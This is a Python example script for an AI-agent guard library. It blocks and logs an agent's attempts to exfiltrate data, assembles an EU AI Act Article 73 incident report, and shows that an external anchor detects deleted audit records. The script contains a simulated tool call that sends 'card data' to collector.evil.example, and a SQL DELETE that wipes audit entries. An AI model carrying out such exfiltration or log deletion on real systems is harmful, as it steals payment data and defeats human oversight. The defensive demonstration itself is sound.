"""From audit signal to an EU AI Act Article 73 incident report — and
proving the evidence wasn't tampered with afterwards.

  1. An agent repeatedly tries to send data to an unknown host; Marshal
     blocks each attempt and records it in a hash-chained SQLite log.
  2. `incident_candidates()` surfaces that burst for triage. It never
     declares an incident itself — that's a legal judgment.
  3. A DPO declares one with `record_incident()`. The declaration, and its
     awareness time (which starts Article 73's clock), go into the same
     tamper-evident chain.
  4. `serious_incident_report()` computes the deadlines and assembles the
     evidence: related activity (counts, never content) and chain integrity.
  5. Someone deletes the newest audit records. The chain alone can't tell
     (what's left is still a valid, shorter chain), but an anchor published
     earlier, outside the database, catches it.

Run: python examples/incident_report_example.py
"""

import sqlite3
import tempfile
import time
from pathlib import Path

from marshal_ai import (
    EgressAllowlist,
    EgressPolicy,
    Principal,
    RiskTierPolicy,
    SQLiteAuditSink,
    ToolCallDenied,
    ToolGuard,
    incident_candidates,
    record_incident,
    render_incident_markdown,
    serious_incident_report,
)

db_path = Path(tempfile.mkdtemp()) / "audit.db"
sink = SQLiteAuditSink(db_path)

print("=== 1. repeated exfiltration attempts, each blocked ===")
policy = EgressPolicy(RiskTierPolicy({"low": "allow"}), EgressAllowlist(["*.ourcompany.example"]), audit_sink=sink)
http_post = ToolGuard(tool=lambda url, body: "ok", policy=policy, audit_sink=sink, tool_name="http_post")
agent = Principal("billing-agent/session-19", on_behalf_of=Principal("customer-881"))
for i in range(4):
    try:
        http_post.call(agent, {"url": f"https://collector.evil.example/u?batch={i}", "body": "card data"})
    except ToolCallDenied:
        pass
http_post.call(agent, {"url": "https://api.ourcompany.example/invoices", "body": "ok"})
print(f"{len(sink)} audit records written")

print("\n=== 2. triage signals ===")
for signal in incident_candidates(sink):
    print(f"  {signal.signal}: {signal.count}x by {signal.principals}")

anchor = sink.anchor()  # publish this somewhere the DB's writer can't rewrite
print(f"\nanchor published externally: count={anchor.count} head={anchor.head_hash[:16]}…")

print("\n=== 3. the DPO declares a serious incident ===")
incident = record_incident(
    sink,
    Principal("dpo@ourcompany.example"),
    title="Billing agent attempted to send card data to an external host",
    category="fundamental_rights",
    description="Four blocked attempts to POST payment data to collector.evil.example; source prompt under investigation.",
    role="deployer",
    affected_principals=("billing-agent/session-19",),
    window_start=time.time() - 3600,
)
print("declared", incident.incident_id)

print("\n=== 4. the report ===\n")
print(render_incident_markdown(serious_incident_report(sink, incident.incident_id)))

print("=== 5. someone deletes the newest audit records ===")
sink.close()
conn = sqlite3.connect(db_path)
conn.execute("DELETE FROM audit_entries WHERE seq > (SELECT MAX(seq) - 4 FROM audit_entries)")
conn.commit()
conn.close()
reopened = SQLiteAuditSink(db_path)
print("chain alone:      ", "ok" if reopened.verify().ok else "TAMPERED")
result = reopened.verify(anchor=anchor)
print("against anchor:   ", "ok" if result.ok else f"TAMPERED — {result.reason}")
reopened.close()
